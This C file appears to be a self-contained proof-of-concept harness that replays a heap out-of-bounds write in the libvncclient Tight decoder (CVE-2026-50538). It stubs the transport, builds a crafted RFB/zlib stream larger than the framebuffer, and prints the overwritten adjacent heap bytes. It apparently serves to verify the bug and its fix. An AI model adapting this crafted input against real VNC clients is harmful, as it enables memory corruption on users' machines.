/*
 * libvncclient Tight decoder OOB write replay (GHSA-v9pm-47h4-jcq8 /
 * CVE-2026-50538).  The vulnerable and fixed HandleTightBPP/FilterCopyBPP
 * bodies come verbatim from two pinned libvncserver commits via gen_fn.py;
 * everything here is a minimal transport/allocator stub around them.
 *
 * No network is used. The scripted RFB input is built in-process and handed
 * to ReadFromRFBServer(); the hostile zlib stream is compressed locally.
 */
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>

/* Constants copied verbatim from the pinned include/rfb/rfbproto.h and
 * src/libvncclient/rfbclient.c (see PROVENANCE.md). */
#define RFB_BUFFER_SIZE (640*480)
#define ZLIB_BUFFER_SIZE 30000
#define TIGHT_GRADIENT_MAX_WIDTH 2048
#define TIGHT_MIN_TO_COMPRESS 12
#define rfbTightExplicitFilter 0x04
#define rfbTightFill          0x08
#define rfbTightJpeg          0x09
#define rfbTightNoZlib        0x0A
#define rfbTightMaxSubencoding 0x0A
#define rfbTightFilterCopy     0x00
#define rfbTightFilterPalette  0x01
#define rfbTightFilterGradient 0x02

#define BPP 32
#define TRUE 1
#define FALSE 0
typedef int rfbBool;

typedef struct {
    uint8_t *frameBuffer;
    int width, height;
    struct {
        int depth, bigEndian;
        int redMax, greenMax, blueMax;
        int redShift, greenShift, blueShift;
    } format;
    uint8_t buffer[RFB_BUFFER_SIZE];
    char zlib_buffer[ZLIB_BUFFER_SIZE];
    z_stream zlibStream[4];
    rfbBool zlibStreamActive[4];
    rfbBool cutZeros;
    int rectWidth, rectColors;
    void (*GotFillRect)(void *c, int x, int y, int w, int h, uint32_t col);
} rfbClient;

/* Macros the verbatim functions need, taken from pinned tight.c. */
#define CONCAT2E(a,b) a##b
#define CONCAT3E(a,b,c) a##b##c
#define CARDBPP uint32_t
#define filterPtrBPP filterPtr32
#define HandleTightBPP HandleTight32
#define InitFilterCopyBPP InitFilterCopy32
#define InitFilterPaletteBPP InitFilterPalette32
#define InitFilterGradientBPP InitFilterGradient32
#define FilterCopyBPP FilterCopy32
#define FilterPaletteBPP FilterPalette32
#define FilterGradientBPP FilterGradient32
#define DecompressJpegRectBPP DecompressJpegRect32
#define Swap32(l) ((((l) >> 24) & 0x000000ff)| \
                   (((l) & 0x00ff0000) >> 8)  | \
                   (((l) & 0x0000ff00) << 8)  | \
                   (((l) & 0x000000ff) << 24))
#define NEED_SWAP (client->format.bigEndian)
#define RGB24_TO_PIXEL32_NOSWAP(r,g,b) \
    (((uint32_t)(r) & 0xFF) << client->format.redShift | \
     ((uint32_t)(g) & 0xFF) << client->format.greenShift | \
     ((uint32_t)(b) & 0xFF) << client->format.blueShift)
#define RGB24_TO_PIXEL32_SWAP(r,g,b) \
    (((uint32_t)(r) & 0xFF) << (24 - client->format.redShift) | \
     ((uint32_t)(g) & 0xFF) << (24 - client->format.greenShift) | \
     ((uint32_t)(b) & 0xFF) << (24 - client->format.blueShift))
#define RGB24_TO_PIXEL32(r,g,b) NEED_SWAP ? \
    RGB24_TO_PIXEL32_SWAP(r,g,b) : RGB24_TO_PIXEL32_NOSWAP(r,g,b)

typedef void (*filterPtr32)(rfbClient *, int, int, int);
static int InitFilterCopy32(rfbClient *c, int w, int h);
static void FilterCopy32(rfbClient *c, int x, int y, int n);
static int InitFilterGradient32(rfbClient *c, int w, int h);
static int InitFilterPalette32(rfbClient *c, int w, int h);
static void FilterPalette32(rfbClient *c, int x, int y, int n);
static void FilterGradient32(rfbClient *c, int x, int y, int n);
static rfbBool DecompressJpegRect32(rfbClient *c, int x, int y, int w, int h);

/* --- transport stubs --------------------------------------------------- */
typedef void (*rfbClientLogProc)(const char *format, ...);
rfbClientLogProc rfbClientLog, rfbClientErr;

static void log_msg(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vprintf(fmt, ap); va_end(ap);
}
static void err_msg(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(stderr, fmt, ap); va_end(ap);
}

static const uint8_t *feed;
static unsigned feed_len, feed_pos;
static int feed_ok = 1;

static rfbBool ReadFromRFBServer(rfbClient *c, char *out, unsigned int n) {
    (void)c;
    if (feed_pos + n > feed_len) { feed_ok = 0; return FALSE; }
    memcpy(out, feed + feed_pos, n);
    feed_pos += n;
    return TRUE;
}

/* CompactLen is a 1..3 byte little-endian 7-bit length on the wire. This stub
 * consumes that encoding so the scripted stream is byte-accurate. */
static long ReadCompactLen(rfbClient *c) {
    (void)c;
    long len = 0; unsigned shift = 0;
    for (;;) {
        uint8_t b;
        if (!ReadFromRFBServer(c, (char *)&b, 1)) return -1;
        len |= (long)(b & 0x7f) << shift;
        if (!(b & 0x80)) break;
        shift += 7;
        if (shift > 21) return -1;
    }
    return len;
}

/* --- verbatim pinned functions ----------------------------------------- */
#include "tight_fn.inc"

/* --- stubs only reachable on non-Copy filter paths (never exercised) --- */
static int InitFilterPalette32(rfbClient *c, int w, int h) {
    (void)c; (void)w; (void)h; return 0;
}
static void FilterPalette32(rfbClient *c, int x, int y, int n) {
    (void)c; (void)x; (void)y; (void)n;
}
static void FilterGradient32(rfbClient *c, int x, int y, int n) {
    (void)c; (void)x; (void)y; (void)n;
}
static int InitFilterGradient32(rfbClient *c, int w, int h) {
    (void)c; (void)w; (void)h; return 0;
}
static rfbBool DecompressJpegRect32(rfbClient *c, int x, int y, int w, int h) {
    (void)c; (void)x; (void)y; (void)w; (void)h; return FALSE;
}

/* --- driver ------------------------------------------------------------ */
#ifndef FB_ALLOC
#define FB_ALLOC 1024
#endif
#ifndef ROWS
#define ROWS 32
#endif
#ifndef CHOSEN_BASE
#define CHOSEN_BASE 0x41
#endif

#define FB_W 16
#define FB_H 16
#define ROW_BYTES (FB_W * 4)          /* rw=16, bitsPixel=32 */
#define PLANE_BYTES (FB_W * FB_H * 4) /* 1024 */

static uint8_t *plane;
static uint8_t zin[1 << 16];
static uint8_t zout[1 << 16];
static uint8_t stream[1 << 16];

int main(void) {
    rfbClient *c = (rfbClient *)calloc(1, sizeof(*c));
    plane = (uint8_t *)malloc(FB_ALLOC);
    if (!plane) return 2;
    memset(plane, 0, FB_ALLOC);
    c->frameBuffer = plane;
    c->width = FB_W;
    c->height = FB_H;
    c->format.depth = 32;         /* cutZeros = FALSE -> plain memcpy path */
    c->format.bigEndian = 0;
    c->format.redMax = c->format.greenMax = c->format.blueMax = 0xFF;
    c->format.redShift = 16; c->format.greenShift = 8; c->format.blueShift = 0;
    rfbClientLog = log_msg;
    rfbClientErr = err_msg;

    /* Attacker-chosen decompressed plane: ROWS rows of a repeating pattern. */
    size_t raw_len = (size_t)ROWS * ROW_BYTES;
    for (size_t i = 0; i < raw_len; i++) zin[i] = (uint8_t)(CHOSEN_BASE + (i % 16));
    uLongf clen = sizeof(zout);
    if (compress2(zout, &clen, zin, raw_len, 9) != Z_OK) return 3;

    /* Scripted RFB input: comp_ctl, 7-bit compressed length, zlib bytes. */
    unsigned p = 0;
    stream[p++] = rfbTightFilterCopy; /* 0x00: basic Tight, copy filter */
    long L = (long)clen;
    if (L < 128) {
        stream[p++] = (uint8_t)L;
    } else {
        stream[p++] = (uint8_t)((L & 0x7f) | 0x80);
        stream[p++] = (uint8_t)((L >> 7) & 0x7f);
    }
    memcpy(stream + p, zout, clen); p += (unsigned)clen;
    feed = stream; feed_len = p; feed_pos = 0; feed_ok = 1;

    printf("raw_rows=%d raw_len=%zu compressed=%lu fb_alloc=%d\n",
           ROWS, raw_len, (unsigned long)clen, FB_ALLOC);
    rfbBool rc = HandleTight32(c, 0, 0, FB_W, FB_H);
    printf("rc=%d feed_ok=%d\n", rc, feed_ok);

#if FB_ALLOC > PLANE_BYTES
    /* Plain build: read back the adjacent heap the vulnerable memcpy reached. */
    printf("oob16=");
    for (int i = 0; i < 16; i++) printf("%02x", plane[PLANE_BYTES + i]);
    printf("\n");
    printf("inbounds16=");
    for (int i = 0; i < 16; i++) printf("%02x", plane[i]);
    printf("\n");
#endif
    free(c);
    free(plane);
    return 0;
}
